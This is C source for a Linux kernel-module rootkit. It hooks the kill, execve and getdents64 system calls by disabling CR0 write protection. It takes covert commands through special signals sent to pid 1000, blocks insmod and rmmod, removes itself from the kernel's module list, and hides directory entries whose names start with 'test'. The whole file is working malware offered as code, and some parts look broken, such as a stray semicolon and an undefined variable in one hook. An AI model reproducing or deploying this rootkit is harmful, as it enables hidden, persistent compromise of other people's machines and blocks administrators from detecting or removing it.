#include "dragon.h"

#define DIR_PREFIX "test"

struct list_head * prev_module;

struct SYS_HOOK64 hook_sys_execve64;
struct SYS_HOOK64 hook_sys_kill64;
struct SYS_HOOK64 hook_sys_getdents64;
/*
///////////////////////////////////////////////////
				Main functions
///////////////////////////////////////////////////
*/


/* Handlers */

/*
	The mains functions is here, we can communic with the rootkit by 2 ways : signals and network.
*/

void signal_handler(int sig)
{	
	debug_print("%s in signal_handler : received signal %d" , DEBUG_PREFIX , sig);
	switch(sig)
	{
		case 50:
			debug_print("%s blocking insmod and rmmod execution.\n" , DEBUG_PREFIX);
			install_x64sct_hook(&hook_sys_execve64);
			break;

		case 51:
			debug_print("%s blocking insmod and rmmod execution desactivate.\n", DEBUG_PREFIX);
			uninstall_x64sct_hook(&hook_sys_execve64);
			break;
		case 52:
			debug_print("%s hiding the lkm from userspace.\n" , DEBUG_PREFIX);
			hide_lkm();
			break;
		case 53:
			debug_print("%s showing the lkm from userspace.\n" , DEBUG_PREFIX);
			show_lkm();
			break;

	}
}

/* Init and Exit module */

/*
	These 2 functions are respectively called when the module is inserted / removed from the kernel
	They install/unsintanll hook to handle signals and pass it to the signal handler, enable/disable stealth
	features.
*/
static int __init lkm_init(void)
{
	unsigned long ** x64_sct;

	if(!(x64_sct = get_x64sct_address())) 
	{
		debug_print("%s in lkm_init(): Can't locate the x64 syscall table.\n", DEBUG_PREFIX);
		return -EFAULT;
	}

	register_x64sct_hook(&hook_sys_kill64, __NR_kill, (void*)hSys_kill, (unsigned long *)&oSys_kill, x64_sct);
	register_x64sct_hook(&hook_sys_execve64, __NR_execve, (void*)hSys_execve, (unsigned long*)&oSys_execve, x64_sct);
	register_x64sct_hook(&hook_sys_getdents64, __NR_getdents64, (void*)hSys_getdents64, (unsigned long*)&oSys_getdents64, x64_sct);

	install_x64sct_hook(&hook_sys_kill64);

	return 0;
}

static void __exit lkm_exit(void)
{
	debug_print("%s: lkm_exit() called.\n", DEBUG_PREFIX);
	show_lkm();
	uninstall_x64sct_hook(&hook_sys_kill64);
}


/*
///////////////////////////////////////////////////
				Hook syscalls
///////////////////////////////////////////////////
*/

static void register_x64sct_hook(struct SYS_HOOK64 * hook, unsigned long offset, void * hook_address, unsigned long * original_address_ptr , unsigned long ** syscall_table)
{
	debug_print("%s in register_x64sct_hook() : registering hook for 64 bits sys call table offset %lu.\n" , DEBUG_PREFIX, offset);

	//Set the status to 0 ( disabled )
	hook->bStatus = 0;

	//Filling the offset	
	hook->offset = offset;

	//Filling the sys call table ptr
	hook->x64_sct = syscall_table;

	//Filling the hook address
	hook->hook_address = hook_address;

	//Filling the original address
	hook->original_address = (unsigned long **)original_address_ptr;
}


static unsigned long* __install_tramphook64(unsigned long offset , unsigned long * dst, unsigned long ** sct)
{
	unsigned long * old_address;

	
	old_address = sct[offset];

	disable_wp();

	sct[offset] = dst;

	enable_wp();

	return old_address;
}
static unsigned long* __uninstall_tramphook64(unsigned long offset , void* dst, unsigned long ** sct )
{

	disable_wp();

	sct[offset] = dst;

	enable_wp();

	return sct[offset];
}

static int install_x64sct_hook(struct SYS_HOOK64* hook)
{

	if(!hook->bStatus)
	{

		debug_print("%s : installing syscall hook on number %lu.\n" , DEBUG_PREFIX , hook->offset);

		*hook->original_address = __install_tramphook64(hook->offset, hook->hook_address, hook->x64_sct);

		hook->bStatus = 1;

		return 0;

	}
	return 1;
}
static int uninstall_x64sct_hook(struct SYS_HOOK64* hook)
{

	if(hook->bStatus)
	{
		debug_print("%s : uninstalling syscall hook on number %lu.\n" , DEBUG_PREFIX , hook->offset);
		
		__uninstall_tramphook64(hook->offset, (unsigned long *)(*hook->original_address), hook->x64_sct);

		hook->bStatus = 0;

		return 0;
	}
	return 1;	
}


/*	Locate the syscall table (only for 64 bits address)	*/

/*
	There are multiples way to locate sct table, but 2 are implemented
	1. Directly using kallsyms_lookup_name()
	2. Using kprobe to locate using kallsyms_lookup_name() then use it
*/
static unsigned long **get_x64sct_address(void)
{
	int kprobe_res = 0;
	unsigned long **sct = NULL;
	typedef unsigned long (*kallsyms_lookup_name_t) (const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;

	/* register the kprobe */
	if(( kprobe_res = register_kprobe(&kp)) != 0)
	{
		debug_print("%s in get_sct_address(): register_kprobe() failed with %d.\n", DEBUG_PREFIX, kprobe_res);
		return NULL;
	}

	debug_print("%s in get_sct_address(): kp.addr = %016x", DEBUG_PREFIX, kp.addr);

	kallsyms_lookup_name = (kallsyms_lookup_name_t)kp.addr;

	/* Work done so unregister */
	unregister_kprobe(&kp);

	sct = (unsigned long **)kallsyms_lookup_name("sys_call_table");

	return sct;
}


/* syscalls hook and template definitions */

/*
	Since kernel version 4.17 syscalls' args are passed to the functions using pt_regs structre
*/
#ifdef USE_PT_REGS
asmlinkage long hSys_kill(const struct pt_regs* regs)
{
	int signal = (int)regs->si;
	pid_t pid = (pid_t)regs->di;

	if (pid == 1000)
		signal_handler(signal);

	return oSys_kill(regs);
}
asmlinkage long hSys_open(const struct pt_regs* regs)
{
	//debug_print("%s in hSys_open(): hooked.\n", DEBUG_PREFIX);
	return oSys_open(regs);
}
asmlinkage long hSys_execve(const struct pt_regs* regs)
{
	char* executable = (char*)regs->di;

	if ((strcmp(executable , "/usr/bin/insmod") == 0) | (strcmp(executable, "/usr/bin/rmmod") == 0))
	{
		debug_print("%s in hSys_execve : %s execution blocked.\n" , DEBUG_PREFIX, executable);
		return -ENOENT;
	}

	return oSys_execve(regs);
}

asmlinkage long hSys_getdents64(const struct pt_regs* regs)
{
	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
	struct linux_dirent64 * kernel_dirent;
	struct linux_dirent64 * current_dirent;
	struct linux_dirent64 * next_dirent;
	unsigned long offset = 0;
	int nread, error;

	//Call original getdents64 function to get the buffer and iterate it	
	nread = oSys_getdents64(regs);
	if(nread < 0)
	{
		return nread;
	}

	kernel_dirent = kzalloc(nread, GFP_KERNEL);
	if(kernel_dirent == NULL)
	{
		return nread;
	}

	//Retrieve user buffer
	error = copy_from_user(kernel_dirent, dirent, nread);
	if(error)
	{
		debug_print("%s in hSys_getdents64 : error copy_from_user(kernel_dirent, dirent, nread) == %d" , DEBUG_PREFIX , error);
		goto done;
	}

	while(offset < nread)
	{
		current_dirent = (void *)kernel_dirent + offset;

		if (memcmp(DIR_PREFIX, current_dirent->d_name, strlen(DIR_PREFIX)) == 0)
        {
			//Decrement the nread value ( because we reduce the size of the buffer)
			nread -= current_dirent->d_reclen;

			next_dirent = (void *)current_dirent + current_dirent->d_reclen;

			//Overwrite the current dirent block with the nexts blocks
			memmove(current_dirent, next_dirent, nread);

        } else {
			offset += current_dirent->d_reclen;
		}
	}

	error = copy_to_user(dirent, kernel_dirent, nread);
	if(error)
	{
		debug_print("%s in hSys_getdents64 : error copy_to_user(dirent, kernel_dirent, nread) == %d" , DEBUG_PREFIX , error);
		goto done;
	}

done:
	kfree(kernel_dirent);
	return nread; 	
}
asmlinkage long hSys_init_module(const struct pt_regs* regs)
{
	debug_print("%s: init_module syscall hooked.\n" , DEBUG_PREFIX);
	return oSys_init_module(regs);
}
asmlinkage long hSys_mkdir(const struct pt_regs* regs)
{
	debug_print("%s: HOOKED.\n", DEBUG_PREFIX);
	return oSys_mkdir(regs);
}
#else
asmlinkage long hSys_getdents64(unsigned int fd, struct linux_dirent64 __user* buffer, unsigned int size)
{
	return oSys_getdents64(fd,buffer,size);
}
asmlinkage long hSys_kill(pid_t pid, int signal)
{

	debug_print("%s received signal %d to %d" , DEBUG_PREFIX , signal, pid);

	signal_handler(signal);

	return oSys_kill(pid, signal);
}
asmlinkage long hSys_open(const char __user* filename, int flags, umode_t mode)
{
	//debug_print("%s in hSys_open(): hooked.\n", DEBUG_PREFIX);
	return oSys_open(filename, flags, mode);
}
asmlinkage long hSys_execve(const char __user* executable, const char __user *const __user * argv, const char __user *const __user* envp);
{
	if ((strcmp(executable , "/usr/bin/insmod") == 0) | (strcmp(executable, "/usr/bin/rmmod") == 0))
	{
		debug_print("%s in hSys_execve : %s blocked.\n" , DEBUG_PREFIX, executable);
		return -ENOENT;
	}
	return oSys_execve(executable_path, argv, envp);
}
#endif

/*	On/Off write protections	*/
static inline void write_forced_cr0(unsigned long new_val)
{
	unsigned long __force_order;

	asm volatile ("mov %0,%%cr0" : "+r" (new_val), "+m"(__force_order));
}
static inline void disable_wp(void)
{
	/* AND oerations between actual value of cr0 and reversed value of 0x10000 (0x01111) */
	write_forced_cr0(read_cr0() & (~0x10000));
}
static inline void enable_wp(void)
{
	write_forced_cr0(read_cr0() | 0x10000);		
}

/* Disable / enable stealth features */

static int hide_lkm(void)
{
	prev_module = (&THIS_MODULE->list)->prev;
	list_del(&THIS_MODULE->list);

	install_x64sct_hook(&hook_sys_getdents64);

	return 0;
}
static int show_lkm(void)
{
	uninstall_x64sct_hook(&hook_sys_getdents64);
	list_add(&THIS_MODULE->list, prev_module);
	return 0;
}